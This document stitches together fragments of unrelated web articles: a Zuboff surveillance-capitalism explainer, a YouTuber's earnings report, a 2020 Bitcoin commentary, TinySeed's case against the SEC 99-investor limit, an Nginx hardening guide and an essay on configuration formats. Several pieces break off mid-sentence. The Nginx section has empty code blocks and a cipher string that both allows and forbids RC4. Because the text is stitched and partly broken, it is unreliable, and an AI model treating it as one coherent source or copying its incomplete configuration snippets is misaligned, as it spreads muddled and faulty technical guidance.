explaining something so perplexing and complex yet significant.</p><p><strong>Read more in our <a href="https://thecookiemag.com/tag/explained/">Explained</a> series, featuring explainers about key ideas and issues in technology.</strong></p><h2>Shoshana Zuboff’s definition of surveillance capitalism</h2><p>Zuboff’s definition of surveillance capitalism doesn’t rest simply on the collection of data. Instead, she asserts that surveillance capitalism is unique because of the way in which it uses data to modify and manipulate behaviour. “When a firm collects behavioral data with permission and solely as a means to product or service improvement” she writes, “it is committing capitalism but not surveillance capitalism.”</p><p>To emphasise this point, she develops a concept she terms ‘behavioral surplus.’ This is, Zuboff tells us, data drawn from a domain beyond a product or service. Surveillance capitalism, Zuboff explains, “unilaterally claims human experience as free raw material for translation into behavioural data” – it turns supposedly non-digital aspects of life into this ‘behavioral surplus’.</p><p>This ‘behavioral surplus’ powers growth. It helps tech companies to modify human behaviours in a way that is commercially useful. Think for example, of the way Google Home products turn domestic life into a vast treasure trove of data for the company.</p><p>Zuboff contrasts the drive to extract behavioural surplus with something she calls the ‘behavioral value reinvestment cycle’. It sounds complicated, but it’s really just a feedback loop. For Zuboff it’s a consumer-friendly way of using data to improve the customer’s experience of a product or service.</p><h3>Advocacy-oriented capitalism</h3><p>‘Behavioural value reinvestment’ is something done by a different type of capitalism. This is what Zuboff calls ‘advocacy-oriented capitalism’. In Zuboff’s narrative of the evolution of capitalism, this is the hero at our current historical and economic juncture: it represents the forces of good, while surveillance capitalism is decidedly evil.</p><p>As the name suggests, advocacy-oriented capitalism is exemplified by companies that leverage the possibilities of the digital revolution to ‘empower’ consumers. Zuboff explains this in more depth by describing surveillance capitalism as “instrumentarian.” This means it is geared towards the modification of behaviour in a way that establishes certainty and predictability that is commercially beneficial. Advocacy oriented capitalism, meanwhile, is far more democratic – it uses data to better respond to consumer needs and demands, not to shape and determine those needs.</p><h3>An aberration of capitalism</h3><p>So, for Zuboff, surveillance capitalism is an aberration or <em>mutation</em> of capitalism.</p><p>In a contemporary context it differs from advocacy oriented capitalism in the way that it attempts to colonize and commodify human experience in order to manipulate and shape it. In a historical context, meanwhile, Zuboff argues that it differs from industrial capitalism because it undermines the “institutionalized reciprocity” that was part and parcel of the Fordist era.</p><p>To put it another way, the age of industrial mass production ensured both stable profits for capitalists, stable employment for workers, and affordable products for consumers.</p><p>Essentially, surveillance capitalism doesn’t find success by responding to the needs and demands of customers like other forms of capitalism. It finds success by manipulating them.</p><h2>Criticism of Zuboff</h2><p>Zuboff’s argument that surveillance capitalism is an aberration of capitalism has come in for significant criticism. Perhaps the best critique of her book comes from <a href="https://thebaffler.com/latest/capitalisms-new-clothes-morozov">Evgeny Morozov in The Baffler</a>.</p><p>Over the course of more than 10,000 words, Morozov takes Zuboff to task for failing to properly interrogate the assumptions on which her conception of surveillance capitalism rests. Zuboff, Morozov writes, “outlines what she believes to be a unique phenomenon, describing it in depth, but without building any bridges (if only to burn them) to the alternative conceptions of that same phenomenon.”</p><p>To put it another way, Zuboff fails to be rigorous in her construction of the concept. By isolating it, she naturalizes it. In turn, this allows it to be used as a validating framework for her implicit theory about the evolution of capitalism.</p><h3>The consumer</h3><p>There’s a lot to cover if you want to properly engage with Morozov’s review. However, the one of the key takeaways from Morozov is that Zuboff is in thrall to the idea of ‘the consumer’ as a sovereign, power from which capitalism takes its cue.</p><p>This is something discussed above. In Zuboff’s view, ‘normal’ capitalism is when consumer demand is met and satisfied effectively. Surveillance capitalism is when the consumer is manipulated and exploited through the extraction of their ‘behavioral surplus’.</p><p>The problems with such an argument are easy to spot.

<p>Earnings on YouTube, everyone knows that it is different for each particular niche and it is based on how many views you get.</p>
<p>A few years back, I was extremely curious as to how much a youtuber can earn at different levels of the “journey”, more specifically, at the beginning.</p>
<p>Here is <strong>exactly how much I earned</strong> on youtube from the moment I got accepted into the adsense program until now💰.</p>

</p></figure>
<p><strong>I started my channel</strong> a while back, when I first released my <a href="https://youtu.be/4q9CNtwdawA">Web Scraping with Puppeteer</a> video back in <strong>November 2018</strong>, which is still valuable and still brings good views even now. </p>
<p>I created those initial videos that you find on my channel for the sole purpose of delivering good quality content and to help people with <a href="https://learnscraping.com/">Scraping with NodeJs</a>, as I also released my first ever Udemy course around the same time to bring some extra traffic and potential sales to it.</p>
<h2><span id="Beginning_to_now"></span>Beginning to now<span></span></h2>
<p>Here are the exact statistics of my “beginner” youtube account, I have under 2,000 subscribers and just got monetized a few months ago 🎉.</p>
<figure><img loading="lazy" width="1024" height="619" src="https://grohsfabian.com/wp-content/uploads/2020/11/youtube-2-years-earnings-stats-beginner-youtuber-1024x619.png" alt="" srcset="https://grohsfabian.com/wp-content/uploads/2020/11/youtube-2-years-earnings-stats-beginner-youtuber-1024x619.png 1024w, https://grohsfabian.com/wp-content/uploads/2020/11/youtube-2-years-earnings-stats-beginner-youtuber-300x181.png 300w, https://grohsfabian.com/wp-content/uploads/2020/11/youtube-2-years-earnings-stats-beginner-youtuber-768x464.png 768w, https://grohsfabian.com/wp-content/uploads/2020/11/youtube-2-years-earnings-stats-beginner-youtuber-1536x929.png 1536w, https://grohsfabian.com/wp-content/uploads/2020/11/youtube-2-years-earnings-stats-beginner-youtuber-2048x1238.png 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
<p>Here are some quick stats that you can also see in the dashboard</p>
<ul><li>My first 4 videos barely got any traction on youtube.</li></ul>
<ul><li>The 5th and 6th videos got viral and were featured on Reddit and newsletters.</li></ul>
<ul><li>I took long breaks, I never was serious about being a YouTuber (though I always liked the idea).</li></ul>
<ul><li>I got monetized on the 1st of September, 2020.</li></ul>
<h2><span id="I_made_$53_in_2_months_and_a_half"></span>I made $53 in 2 months and a half<span></span></h2>

<p>Without any extra work from my side, simply by enabling the Ads on my account, I had made $53.</p>
<p>Now, what do I make of this?</p>
<p>I am honestly impressed by how much you can earn with just a few normal videos in this niche. I can definitely see how this can be transformed into an actual money making business that allows you to live comfortably.</p>
<p>I have learned that if you put enough work and dedication into your craft, the results will come. This can be also applied to creating videos and being a youtuber.</p>
<h2><span id="Top_earning_videos"></span>Top earning videos<span></span></h2>
<p>I think this is an important topic to talk about as if you are paying attention, it shows you a lot about people and how it all works.</p>

<ul><li><strong>Web Scraping with Puppeteer in 10 minutes</strong> (42,000+ views) – has a very catchy title and it actually delivers good and quality content in a short amount of time.</li></ul>
<ul><li><strong><a href="https://youtu.be/kOaP5qI0N1M">How much I earned with my first course on Udemy</a></strong> (3,500+ views) – this is a known one, people are interested in money and how much you can make by being a YouTuber or any other niche. </li></ul>
<ul><li><strong>Building an Instagram Like Bot</strong> (32,000+ views) – this video would’ve made much more if it would’ve been monetized back when it was released as it was a trendy subject back in 2018.</li></ul>

<p>I hope these statistics have satisfied your curiosity on how much you can earn on youtube while having under 2,000 subscribers.</p>

<p>Bitcoin is at full bull-mode since the March 2020 crash. Currently, it is pumping non-stop without significant correction (20-30% correction is very normal in a bull market.) Bitcoin has even broken an all-high time record since its decline in January 2018 from $20k. Last time when it went above $20k it could not hold for much longer and crashed shortly after.</p>
<p>Will it do the same now that it has reached the $17k mark? Let’s take a look at the factors causing it upward direction.</p>
<h2>Institutional Adoption</h2>
<p>Institutional adoption is growing fast and several companies like <a href="https://fortune.com/2020/08/11/buying-bitcoin-microstrategy-cryptocurrenc/">Microstrategy</a>&nbsp;and <a href="https://www.cnbc.com/2020/10/08/square-buys-50-million-in-bitcoin-says-cryptocurrency-aligns-with-companys-purpose.html">Square</a> has already bought Bitcoin as a hedge against Fiat. Despite its business connections, Bitcoin is still not as talked about as the 2017 craze, according to Google Trend’s retail interest.</p>
<p>It may take more of a public adoption in order to hold its ATH (all-time high) this time around.</p>
<h2>Technical Analysis</h2>
<p>Now let’s get technical. Here are a few trends that make BTC look stable.</p>
<ul>
<li>BTC/USD pair is currently in range bound and this can be a signal of a strong uptrend.</li>
<li>Bitcoin price is trading above a 21-Day WEMA (Weighted Estimated Moving Average)</li>
<li>The RSI (relative strength index) is at 50</li>
</ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-e7b2ccadd106c01a49f9"><div><h3>The current limit of 99 accredited investors <strong>hurts capital formation</strong>, <strong>reduces investment opportunities</strong>, <strong>increases the risk to individual investors</strong> and <strong>decreases access to private capital markets for underrepresented groups</strong>.</h3><p>At TinySeed, we are in the process of <a href="https://tinyseed.com/latest/invest">raising the second fund</a> for our SaaS accelerator, and we’re often asked why we have such a high minimum investment. If an <a href="https://www.investopedia.com/terms/a/accreditedinvestor.asp">accredited investor</a> wants to put in $50,000, why would we turn them down?&nbsp;</p><p>It all comes down to SEC regulations, which limit funds like ours to a maximum of 99 accredited investors. In order to raise the amount of capital required to execute on <a href="https://tinyseed.com/thesis">our investment thesis</a>, we must enforce a (relatively) high minimum investment.&nbsp;</p><p>We didn’t write this article to complain about our situation, as <a href="https://tinyseed.com/invest">fundraising (even with this minimum in place) is going quite well</a>. But for us, this process has brought to light an unintended consequence of this 99 investor limit.</p><p>Over time, successful venture firms raise larger and larger funds, quickly running into the 99 investor limit, and forcing their investment minimum higher. <strong>These high minimums concentrate this wealth creation opportunity to super high net worth individuals and institutional investors, excluding accredited investors who cannot afford to write such a large check.</strong></p><p>The SEC enforces certain kinds of regulations to provide investor protections against fraud and abuse, which we salute. However, current regulations (and this 99 investor limit) prohibit the average accredited investor from accessing these markets in a meaningful way. This matters because the private markets are a significant driver of wealth creation.</p><p>We fully understand that the SEC needs to have some limit on the number of investors that can invest in a private fund. <strong>However, we believe that the current limit of 99 is the wrong approach.&nbsp;</strong></p><p>We started TinySeed because we wanted to give founders more options for capital to grow their companies, and we feel that as a fund, we can and should also call for change in how sophisticated investors are able to invest their money.<strong><em> </em></strong>Specifically, we believe that successful tech founders and operators should be able to invest into the field they understand best — early stage technology — instead of being limited to real estate or the public markets.</p><p>We believe funds like ours should be able admit up to 1999 accredited investors, assuming they are required to make reasonable efforts to verify that investors are accredited.</p><h3>As the current rules are enshrined in law, we’re exploring ways to bring this issue in front of Congress. <strong>If you are an emerging manager or stakeholder who would like to see the 99 investor limit raised, send us an email at </strong><a href="mailto:hello@tinyseed.com"><strong>hello@tinyseed.com</strong></a><strong>.</strong></h3><p><strong>Please help raise awareness of this issue:</strong></p><ul data-rte-list="default"><li><p><a href="https://twitter.com/intent/tweet?text=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem%20">Share on Twitter</a></p></li><li><p><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem" target="_blank">Share on Facebook</a></p></li><li><p><a href="https://www.linkedin.com/shareArticle?mini=true&amp;source=TinySeed&amp;summary=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20&amp;title=&amp;url=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem">Share on LinkedIn</a></p></li></ul><p>Fund regulations and SEC rules are fairly complicated; read on for our breakdown of what everything means below:<br></p><h2>Current SEC regulatory regime for private funds</h2><h3>3(c)(1) vs. 3(c)(7)</h3><p>The SEC’s regulatory regime currently provides 2 exemptions to the (burdensome and expensive) requirement for a venture fund like ours to be registered with the SEC: 3(c)(1) and 3(c)(7).</p><p>A 3(c)(1) fund may have no more than 99 Accredited Investors, while a 3(c)(7) fund can have up to 1999 investors, but these must all be “Qualified Purchasers”. The qualified purchaser, or QP, definition is a significant increase in the required net worth compared to accredited investors.</p><h3>Why can’t investors pool their money and create a single entity to invest?</h3><p>The SEC stipulates that accredited investors cannot pool their money and create a single entity (for example through an SPV) to invest in the fund – the SEC will “look through” this entity and count the number of investors there as long as the entity was created for the purpose of making a specific investment.&nbsp;</p><h3>Why can’t we create parallel funds?</h3><p>Another often suggested option, to run several parallel funds that co-invest, is also forbidden, as the SEC will count as a single fund, any set of funds that a reasonable investor would deem to be identical.</p><h3>One burdensome option: The “QP sleeve”</h3><p>The only exception to the above is what’s sometimes referred to as a “QP sleeve”. A 3(c)(1) fund may operate in parallel with a separate 3(c)(7) fund. This does add significant overheads, but frees up some slots for accredited investors by moving the qualified purchasers into the 3(c)(7) (of which there can be 1999).</p><h3>The recent JOBS act</h3><p>A more recent change was introduced with the JOBS act, which expanded the ability of fund managers to promote their offerings publicly, with the trade-off that doing so would tighten the requirement to verify that all investors were in fact accredited investors (a 506c offering). We think these changes are laudable, as they increase awareness of specific offerings among accredited investors while also adding further, appropriate, protections.</p><h2>Recent regulatory efforts to expand investment opportunities, harmonize regulations with other jurisdictions and further capital formation</h2><p>&nbsp;The SEC very recently issued updated accredited investor definitions: </p><blockquote><p>For the first time, individuals will be permitted to participate in our private capital markets not only based on their income or net worth, but also based on established, <strong><em>clear measures of financial sophistication</em></strong>.</p></blockquote><p>(Emphasis ours.)</p><p>We salute this change, and even though we think the SEC has further to go in terms of widening the definition of accredited investors, it’s a great first step. This change is well inline with the SECs ongoing efforts to “simplify, harmonize, and improve the exempt offering framework, thereby expanding investment opportunities while maintaining appropriate investor protections and promoting capital formation.”</p><p><strong>&nbsp;However, we believe that the current limit of 99 accredited investors per 3(c)(1) fund runs counter to these efforts.</strong></p><h2>The many downsides of the 99 accredited investor limit</h2><p>The current limit of 99 accredited investors <strong>hurts capital formation</strong>, <strong>reduces investment opportunities</strong>,&nbsp; <strong>increases the risk to individual investors</strong> and <strong>decreases access to private capital markets for underrepresented groups</strong>.</p><ul data-rte-list="default"><li><p>A fund manager can accept smaller checks from wealthier individuals, as the higher QP limit in the sleeve means that there is effectively no minimum amount required of those individuals. </p></li><li><p>Conversely, and perversely, a fund manager looking to raise a more substantial fund is forced to ask for larger checks from the less wealthy investor, or keep that investor out of the fund entirely.</p></li></ul><p><strong>This is far from ideal and, in our experience, excludes sophisticated investors from being allowed to invest in funds like ours. </strong>In some cases these excluded investors have a deep understanding of the industry being invested into, and perhaps with atypical backgrounds as far as fund investors go. <strong>We do not believe those kinds of investors should be effectively excluded from making these kinds of investments.</strong></p><p>Instead what happens is that as funds grow from very small (sub $10m) they are forced to seek capital from larger, institutional investors like Fund of Funds, Endowments and various Family Offices.</p><p><strong>While these more institutional LPs are a fine source of capital, it’s undoubtedly true that they are more risk averse and in general prone to relying on a proven track record for the managers they back.&nbsp;</strong></p><p>A great example of this is the University of Texas’ (laudable) Emerging Managers Program. This is a program setup explicitly to support new (aka emerging) managers, though the criteria for selection includes:</p><ul data-rte-list="default"><li><p>Attributable track record within target strategy</p></li><li><p>Investment teams with history of working together</p></li><li><p>Principals known in the investment community and are positively referenceable</p></li></ul><p><strong>Clearly, such terms favor managers that “emerge” from existing funds.</strong> This means that the type of general partners that more easily get backing from these kinds of investors are of the same mold as GPs that already exist.<strong> New and diverse GPs with novel ways to invest are effectively locked into staying small or violating SEC rules.</strong></p><h2>Proposed solution: <br><strong>Allow as many Accredited Investors as Qualified Purchasers.</strong></h2><p>The oversight of private funds is light by definition, so we fully understand why the SEC imposes a limit on the number of investors. Without a limit, a fraudulent fund could become a significant issue if tens or hundreds of thousands of investors could invest.&nbsp;</p><p><strong>However, we feel the unintended consequences of concentrating wealth creation to only super high net worth individuals or institutional investors with the 99 Accredited Investors limit is not the right trade-off in this regard.</strong> We propose that private funds relying on the 3(c)(1) exemption should be allowed to admit up to 1999 accredited investors, assuming they are required to make reasonable efforts to verify that investors are in fact accredited (something that is already a requirement for a 506c offering.)</p><h3><strong>If you are an emerging manager or stakeholder who would like to see the 99 investor limit raised, send us an email at </strong><a href="mailto:hello@tinyseed.com"><strong>hello@tinyseed.com</strong></a><strong>.</strong></h3><p><strong>Please help raise awareness of this issue:</strong></p><ul data-rte-list="default"><li><p><a href="https://twitter.com/intent/tweet?text=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem%20" target="_blank">Share on Twitter</a></p></li><li><p><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem" target="_blank">Share on Facebook</a></p></li><li><p><a href="https://www.linkedin.com/shareArticle?mini=true&amp;source=TinySeed&amp;summary=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20&amp;title=&amp;url=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem" target="_blank">Share on LinkedIn</a></p></li></ul></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Nginx is a lightweight, open-source, robust, high-performance HTTP server and a reverse proxy. It’s the most popular web server, beating Apache and IIS.</p><p>Nginx is recognized for its stability, performance, rich feature set, easy configuration, and low resource consumption.</p><p>While the default configurations are favoured by most people, they are not secure enough, and extra tweaks are needed to reinforce the web server.</p><p>Here, we will look into some actions you can take to strengthen and improve Nginx server security.</p><h2 id="disable-any-unwanted-modules">Disable Any Unwanted Modules</h2><p>While installing Nginx, in default it includes many modules. Currently, we cannot choose modules at runtime. To disable specific modules, you need to recompile Nginx.</p><p>It is advised to disable any modules that are not used as this will decrease the risk of potential attacks by limiting operations.</p><h2 id="implement-ssl-certificate">Implement SSL Certificate</h2><p>The primary and essential step in strengthening your Nginx server security is to include an additional layer of protection using an SSL certificate.</p><p>The SSL certificate is a digital certificate powered by cryptography that encrypts data traffic between your web server and the web browser. SSL certificate also forces your website to use the secure HTTPS protocol over HTTP, which transmits traffic in plain text.</p><p>You can make use of Let’s Encrypt SSL which is free or any certificate according to your preference. There are two additional settings that should be taken care of after you implement a SSL certificate.</p><h3 id="disable-weak-ssltls-protocols">Disable weak SSL/TLS protocols</h3><p>Implementing SSL does not imply that your site is secure. Deprecated versions of SSL such as TLS 1.0, TLS 1.1 are identified as weak, and these protocols are inclined to <a href="https://beaglesecurity.com/blog/article/importance-of-tls-1-3-ssl-and-tls-vulnerabilities.html">SSL and TLS vulnerabilities</a> such as POODLE, BEAST, and CRIME.</p><p>The most commonly used web browsers like Chrome, Firefox, Safari and Edge no longer support TLS 1.0 and TLS 1.1.</p><p>To implement TLS 1.2 and TLS 1.3, we have to edit two configuration files:</p><ul><li><p>/etc/nginx/nginx.conf</p></li><li><p>/etc/nginx/sites-available/default</p></li></ul><p>Locate the following line in <strong><em>nginx.conf</em></strong> file</p><div><figure><pre><code data-lang="shell">       ssl_protocols TLSv1 TLSv1.1 TLSv1.2<span>;</span> <span># Dropping SSLv3, ref: POODLE</span>

   </code></pre></figure></div><p>And, remove TLS versions 1 and 1.1 and add TLS 1.3</p><div><figure><pre><code data-lang="shell">        ssl_protocols TLSv1.2 TLSv1.3<span>;</span> <span># Dropping SSLv3, ref: POODLE</span>

   </code></pre></figure></div><p>However, obsolete protocols also may be present in your Nginx server block configuration files. The block configuration files are in the directory <strong><em>/etc/nginx/sites-available/</em></strong>.</p><p>Therefore, continue and change your block configuration file as before.</p><p>Find the following line</p><div><figure><pre><code data-lang="shell">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2<span>;</span>

   </code></pre></figure></div><p>As before, delete the TLSv1 and TLSv1.1 protocol and add the TLSv1.3.</p><div><figure><pre><code data-lang="shell">        ssl_protocols TLSv1.2 TLSv1.3<span>;</span>

   </code></pre></figure></div><h3 id="disable-weak-cipher-suites">Disable weak cipher suites</h3><p>Weak cipher suites may lead to vulnerabilities, and as a secure practice, we must make sure that only strong ciphers are allowed.</p><p>Add the following to the server block in the <strong><em>ssl.conf</em></strong> file</p><div><figure><pre><code data-lang="shell">        ssl_ciphers <span>"EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384 EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH+aRSA+RC4 EECDH EDH+aRSA HIGH !RC4 !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS"</span><span>;</span>

   </code></pre></figure></div><p>The default state of a Nginx server returns something like Server: nginx/1.12.1 in the server response or error pages. The best method is to remove the header completely. For that, we require the installation of <strong><em>nginx-extras</em></strong>.</p><p>For Debian/Ubuntu</p><div><figure><pre><code data-lang="shell">        <span>sudo </span>apt-get <span>install </span>nginx-extras

    yum <span>install </span>nginx-plus-module-headers-more

   </code></pre></figure></div><p>After installing and restarting the Nginx service, add the following lines to your <strong><em>nginx.conf</em></strong> file.</p><div><figure><pre><code data-lang="shell"> 
        <span># /etc/nginx/nginx.conf</span>
        http <span>{</span>

            more_set_headers <span>'Server: '</span><span>;</span>

   </code></pre></figure></div><p>If no value is specified, the header will be displayed empty. We can also create custom headers as given below.</p><div><figure><pre><code data-lang="shell">

   </code></pre></figure></div><p>To completely disable the server header, find server_token in the Nginx configuration file and set it to server_tokens off (by removing # in the <strong><em>nginx.conf</em></strong> file).</p><p><img src="https://beaglesecurity.com/blog/images/resized/neginx.png-f159357/812x450.png" alt="neinx rename"></p><h2 id="resource-control">Resource Control</h2><p>To counter potential DoS attacks on Nginx it’s possible to set buffer size restrictions for all the clients.</p><p>These settings also prevent any potential buffer overflow attacks.</p><p>Adding the below lines to the <strong><em>nginx.conf</em></strong> file will prevent any such attack.</p><div><figure><pre><code data-lang="shell">        <span>##buffer policy</span>

        <span>##end buffer policy</span>

   </code></pre></figure></div><h2 id="disable-unsafe-http-methods">Disable unsafe HTTP methods</h2><p>Another sound practice for hardening Nginx server is to disable unsafe HTTP methods. Most of the time, GET, HEAD &amp; POST methods are only used.

  <p>… the configuration determines the possible behavior of the machine.</p>

</blockquote>

<h2 id="what-is-configuration-and-why-does-it-matter-for-software">What is configuration and why does it matter for software?</h2>

<p>Let’s root our thinking on configuration in the etymology of the word:</p>

<blockquote>
  <p><strong>configure (.v)</strong></p>

  <p>late 14c. (implied in configured) “to form, dispose in a certain form,” from
Latin <em>configurare</em> “to fashion after a pattern,” from assimilated form of
<em>com</em> “with, together” (see <em>con-</em>) + <em>figurare</em> “to form, shape,” from
<em>figura</em> “a shape, form, figure” (from PIE root <em>*dheigh-</em> “to form, build”).</p>

  <p><cite><a href="https://www.etymonline.com/word/configure#etymonline_v_18185">etymonline</a></cite></p>
</blockquote>

<p>Configuration is essentially concerned with shaping and forming the things in
the world that are receptive to our dictates.</p>

<p>The software we use is composed of programs that impress their patterns into the
<a href="http://webapp1.dlib.indiana.edu/vwwp/view?docId=VAB7144&amp;chunk.id=d1e542&amp;brand=vwwp&amp;doc.view=0&amp;anchor.id=#VAB7144-003">rhythms of our life</a>. While open source software invites user-authors
to read and rewrite these programs at their source, configuration is an
interface that allows user-authors to change program behavior without needing to
rewrite and rebuild the programs. As such, it is the most accessible means for
people to alter the programmed patterns that form and transform their lives.
Questions around the user interface for program configuration pertain directly
to questions about the means and degrees of empowerment in the information age.</p>

<h2 id="in-view-of-informal-systems-vision">In view of Informal System’s vision</h2>

<p>We can articulate four elements in focus for our vision:</p>

<ol>
  <li><strong>open source ecosystems</strong></li>
  <li><strong>cooperative ownership and governance</strong></li>
  <li><strong>distributed organizations</strong></li>
  <li><strong>reliable distributed systems</strong></li>
</ol>

<p>Considering software configuration in terms of interfaces for empowerment, we
can draw clear connections between these elements and the concerns of
configuration.</p>

<p>Our commitment to <strong>open-source ecosystems</strong> is rooted in our agreement with the
core emancipatory agenda of the <a href="https://en.wikipedia.org/wiki/Free_software_movement">Free Software
Movement</a>, which seeks to protect and foster cooperation
by ensuring access to inspect, transform, and run the programs that coordinate
our interactions. Strictly speaking, configurability is orthogonal to
open-source development, since closed-source programs can be arbitrarily
configurable. But the extent to which we make our software susceptible to
intervention and redirection by the people who use it is intimately related to
the wider aims of <em>libre</em> software.</p>

<p>We are <a href="https://theanarchistlibrary.org/library/the-invisible-committe-to-our-friends#toc16">witnessing</a> the most outsized ambitions of the
<a href="https://en.wikipedia.org/wiki/Cybernetics">cyberneticists</a> become actualized and <a href="https://www.ted.com/talks/kevin_slavin_how_algorithms_shape_our_world">reshape our
world</a>. It is now clear that the control over
society and the development of civilization cannot be separated from control
over the programs that determine the courses of our movement, the networks of
our sociality, the flows of our capital, and the availability of our collective
knowledge. The struggle for <strong>cooperative ownership and governance</strong> cannot,
therefore, be separated from the struggle to configure the programs that shape
our reality.</p>

<p>As explained in the following, our preferred approach to configuration is via
plain text files. A principle motivator here is the ease with which plain text
configuration can become a shared interface for shaping <strong>distributed
organizations</strong>: simply checking in a config file to a git repo gives
distributed access and management for configuration of any shared programs that
read from the file.</p>

<p>Software configuration is just as relevant for distributed programs as it is for
any other piece of software. One of our main criteria in evaluating
configuration formats is how easy they make it to reason about and communicate
complex configurations. Reasonable configuration interfaces are even more
critical for <strong>reliable distributed systems</strong> than they are for monolithic,
centralized, synchronous programs, since the distributed nature of the systems
already guarantees a high threshold of complexity.</p>

<p>Choice of configuration file format is one small decision among the countless
decisions that go into designing and implementing software projects. But it is a
decision that sits at the intersection of Informal System’s core concerns, and
the impact of the decision have far reaching implications.</p>

<h2 id="configuration-files">Configuration files</h2>

<p>The following considerations are only concerned with formats of plain text
<a href="https://en.wikipedia.org/wiki/Configuration_file">configuration files</a>. There are interfaces for configuring
programs which are not based around editing text files and you’ve surely used
something similar to one of the following:</p>

<ul>
  <li><a href="https://en.wikipedia.org/wiki/Windows_Registry">The Windows Registry</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Debian_configuration_system">The Debian Configuration system</a></li>
  <li><a href="https://en.wikipedia.org/wiki/System_Preferences">macOS’ Systems Preferences</a></li>
</ul>

<p>But we won’t discuss those here.</p>

<p>Plain text configuration files have distinct benefits that make them especially
appealing to anyone concerned with programmability (which should probably be
everyone, given the ineluctable force of the <a href="https://en.wikipedia.org/wiki/Digital_Revolution">digital
revolution</a>):</p>

<ul>
  <li>There’s no need to build an additional UI for configuration, since
a user-author’s text editor suffices.</li>
  <li>Configuration files are easy to duplicate, share, and place under version
control.</li>
  <li>Configuration files are easy to read and analyze, so user-authors can use them
in ways not initially anticipated.</li>
  <li>Configuration files are easy to write and generate, so user-authors can
program the configuration of their programs.</li>
  <li>Programmable computers are fundamentally about reading and rewriting
(“According to my  definition,” Turing <a href="https://www.cs.virginia.edu/~robins/Turing_Paper_1936.pdf">wrote</a>, “a
number is computable if its decimal can be written down by a machine”) and it
is empowering and illuminating to cleave to foundations, when that will do.</li>
</ul>



<p>We see three approaches to file-based configuration predominating today. Each
has its advantages, but also significant downsides.</p>



<p>These formats are generally limited to very simple key-value pairs. Users of
Unix-like operating systems have likely encountered this species in a <code>.cnf</code>,
<code>.conf</code>, <code>.cfg</code> or <code>.ini</code> file.</p>

<p>These are generally easy for humans to read and write, but are not standardized,
and not a good choice for configurations of any complex or deeply nested
attributes. The lack of principled format and standardization also means they
are less susceptible to elegant or reliable generation. Since we take for
granted that user authors should be able to program the configurations of their
programs, this is a serious shortcoming.</p>

<p><a href="https://github.com/toml-lang/toml">TOML</a> is an interesting configuration format in this space, since it is
designed to provide the easy readability of key-value pair <a href="https://en.wikipedia.org/wiki/INI_file">INI
files</a>, but it can support nested structures – up to a point. One
hits this point <a href="https://github.com/avakar/pytoml/issues/15#issuecomment-217739462">sooner rather than later</a>, however. It
can also be tricky to reason about the scoping rules of the format, and
challenging to generate non-trivial TOML configurations programmatically, and

<p>It has become common practice to use human-readable <a href="https://en.wikipedia.org/wiki/Comparison_of_data-serialization_formats">data-serialization
formats</a> (JSON, YAML, XML, S-Expressions) for application and infrastructure
configuration. While this has certain conveniences (e.g., there is a measure of
transparency), we believe that this approach is suboptimal for plain text
configuration management via configuration files.</p>

<p>In a plain text, open source environment, configuration files are the high-level
interfaces that user-authors touch when shaping their programs to suit their
needs. In contrast, data-serialization formats are – and should be – focused
on machine readability and optimized for data exchange between programs. There
is an impedance mismatch between the aims of data-serialization formats and the
needs of the humans who configure programs.</p>

<p>We see the symptoms of this mismatch all around us. The most obvious sign is the
<a href="https://en.wikipedia.org/wiki/Neoplasm">neoplastic</a> growth of configuration schemes for non-trivial programs, driven
by the inadequacy of data-serialization formats for the task of user-author
configuration. E.g.,</p>

<ul>
  <li>HCL’s <a href="https://www.terraform.io/docs/configuration-0-11/interpolation.html">string interpolation language</a>, born from JSON</li>
  <li>CircleCI’s <a href="https://circleci.com/docs/2.0/reusing-config/#section=configuration">YAML-based programming language</a></li>
  <li>SaltStack’s <a href="https://docs.saltstack.com/en/latest/ref/configuration/examples.html#example-minion-configuration-file">YAML-based surface syntax for Python</a></li>
  <li>Judging by its <a href="https://yaml.org/spec/1.2/spec.html">monstrous spec</a> YAML is itself a symptom of this
mismatch.</li>
  <li><a href="https://en.wikipedia.org/wiki/XML">XML</a> is widely reviled as a configuration format, because, while it is
an excellent extensible markup language, it makes for a very noisy and verbose
configuration syntax and, as a data exchange format, it has no advantages over
s-expressions.</li>
</ul>

<h2 id="configuration-via-a-general-purpose-language">Configuration via a General Purpose Language</h2>

<p>A common alternative is to use a general purpose programming language for
configuration. E.g.,</p>

<ul>
  <li><a href="https://en.wikipedia.org/wiki/Run_commands">Run commands files</a> (like <code>.bashrc</code> or <code>.zshrc</code>)</li>
  <li><a href="https://packaging.python.org/tutorials/packaging-projects/">Python’s packaging</a></li>
  <li>Elixir’s <a href="https://hex.pm/docs/usage">Hex</a> packaging system</li>
